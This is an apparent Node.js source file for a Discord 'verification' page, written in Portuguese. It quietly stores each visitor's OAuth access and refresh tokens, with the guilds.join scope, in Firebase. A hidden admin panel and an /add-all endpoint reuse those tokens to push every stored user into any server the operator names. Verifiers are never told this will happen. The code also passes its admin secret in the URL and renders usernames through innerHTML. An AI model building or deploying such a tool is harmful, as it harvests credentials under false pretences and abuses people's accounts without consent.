const express = require('express');
const axios = require('axios');
const app = express();

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = 'https://discord-oauth-bot-ni1m.onrender.com/callback';
const BOT_TOKEN = process.env.BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const FIREBASE_URL = process.env.FIREBASE_URL;
const ADMIN_SECRET = process.env.ADMIN_SECRET;

async function refreshToken(userId, refresh) {
  const res = await axios.post('https://discord.com/api/oauth2/token',
    new URLSearchParams({
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      grant_type: 'refresh_token',
      refresh_token: refresh,
    }),
    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
  );
  await axios.put(`${FIREBASE_URL}/tokens/${userId}.json`, {
    access_token: res.data.access_token,
    refresh_token: res.data.refresh_token,
  });
  return res.data.access_token;
}

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificação</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .card { background: #1a1a2e; border: 1px solid #5865f2; border-radius: 16px; padding: 40px; text-align: center; max-width: 400px; width: 90%; }
    .logo { font-size: 50px; margin-bottom: 20px; }
    h1 { font-size: 24px; margin-bottom: 10px; color: #fff; }
    p { color: #aaa; margin-bottom: 30px; font-size: 14px; }
    a { background: #5865f2; color: white; padding: 14px 30px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 16px; display: inline-block; transition: 0.2s; }
    a:hover { background: #4752c4; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">🔐</div>
    <h1>Verificação</h1>
    <p>Clique no botão abaixo para verificar sua conta Discord e ter acesso ao servidor.</p>
    <a href="https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify%20guilds.join">
      Verificar com Discord
    </a>
  </div>
</body>
</html>`);
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  try {
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: REDIRECT_URI,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const accessToken = tokenRes.data.access_token;
    const refresh = tokenRes.data.refresh_token;

    const userRes = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    const userId = userRes.data.id;
    const username = userRes.data.username;

    await axios.put(
      `https://discord.com/api/guilds/${GUILD_ID}/members/${userId}`,
      { access_token: accessToken },
      { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
    );

    await axios.put(`${FIREBASE_URL}/tokens/${userId}.json`, {
      access_token: accessToken,
      refresh_token: refresh,
      username
    });

    res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Verificado!</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .card { background: #1a1a2e; border: 1px solid #57f287; border-radius: 16px; padding: 40px; text-align: center; max-width: 400px; width: 90%; }
    h1 { color: #57f287; margin-bottom: 10px; }
    p { color: #aaa; font-size: 14px; }
  </style>
</head>
<body>
  <div class="card">
    <div style="font-size:50px;margin-bottom:20px">✅</div>
    <h1>Verificado!</h1>
    <p>Bem-vindo, <b style="color:white">${username}</b>! Você foi adicionado ao servidor com sucesso.</p>
  </div>
</body>
</html>`);
  } catch (err) {
    res.send('Erro: ' + err.message);
  }
});

app.get('/admin', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Painel Admin</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; padding: 20px; }
    h1 { color: #5865f2; margin-bottom: 20px; }
    .card { background: #1a1a2e; border: 1px solid #333; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
    input { background: #0f0f0f; border: 1px solid #444; color: white; padding: 10px; border-radius: 8px; width: 100%; margin-bottom: 10px; font-size: 14px; }
    button { background: #5865f2; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-size: 14px; width: 100%; }
    button:hover { background: #4752c4; }
    #result { margin-top: 15px; padding: 12px; background: #0f0f0f; border-radius: 8px; font-size: 14px; color: #57f287; display: none; }
    .members { margin-top: 10px; }
    .member { padding: 8px; background: #0f0f0f; border-radius: 6px; margin-bottom: 6px; font-size: 13px; color: #aaa; }
  </style>
</head>
<body>
  <h1>🛡️ Painel Admin</h1>
  
  <div class="card">
    <h3 style="margin-bottom:15px">Adicionar todos em servidor</h3>
    <input type="password" id="secret" placeholder="Senha admin" />
    <input type="text" id="guild" placeholder="ID do servidor destino" />
    <button onclick="addAll()">🚀 Adicionar Todos</button>
    <div id="result"></div>
  </div>

  <div class="card">
    <h3 style="margin-bottom:15px">Membros verificados</h3>
    <input type="password" id="secret2" placeholder="Senha admin" />
    <button onclick="loadMembers()">👥 Ver Membros</button>
    <div class="members" id="members"></div>
  </div>

  <script>
    async function addAll() {
      const secret = document.getElementById('secret').value;
      const guild = document.getElementById('guild').value;
      const res = document.getElementById('result');
      res.style.display = 'block';
      res.textContent = 'Adicionando...';
      const r = await fetch('/add-all?secret=' + secret + '&guild=' + guild);
      res.textContent = await r.text();
    }
    async function loadMembers() {
      const secret = document.getElementById('secret2').value;
      const r = await fetch('/members?secret=' + secret);
      const data = await r.json();
      const div = document.getElementById('members');
      div.innerHTML = '';
      if (data.error) { div.innerHTML = '<p style="color:red">' + data.error + '</p>'; return; }
      data.forEach(m => {
        div.innerHTML += '<div class="member">👤 ' + m + '</div>';
      });
    }
  </script>
</body>
</html>`);
});

app.get('/members', async (req, res) => {
  if (req.query.secret !== ADMIN_SECRET) return res.json({ error: 'Não autorizado' });
  const snap = await axios.get(`${FIREBASE_URL}/tokens.json`);
  const tokens = snap.data || {};
  const members = Object.values(tokens).map(t => t.username || 'desconhecido');
  res.json(members);
});

app.get('/add-all', async (req, res) => {
  if (req.query.secret !== ADMIN_SECRET) return res.send('Não autorizado');
  const newGuild = req.query.guild;
  if (!newGuild) return res.send('Informe o guild');
  try {
    const snap = await axios.get(`${FIREBASE_URL}/tokens.json`);
    const tokens = snap.data;
    let count = 0;
    for (const userId in tokens) {
      try {
        let accessToken = tokens[userId].access_token;
        try { accessToken = await refreshToken(userId, tokens[userId].refresh_token); } catch(e) {}
        await axios.put(
          `https://discord.com/api/guilds/${newGuild}/members/${userId}`,
          { access_token: accessToken },
          { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
        );
        count++;
      } catch (e) {}
    }
    res.send(`Adicionados: ${count} membros`);
  } catch (err) {
    res.send('Erro: ' + err.message);
  }
});

app.listen(3000, () => console.log('Rodando!'));
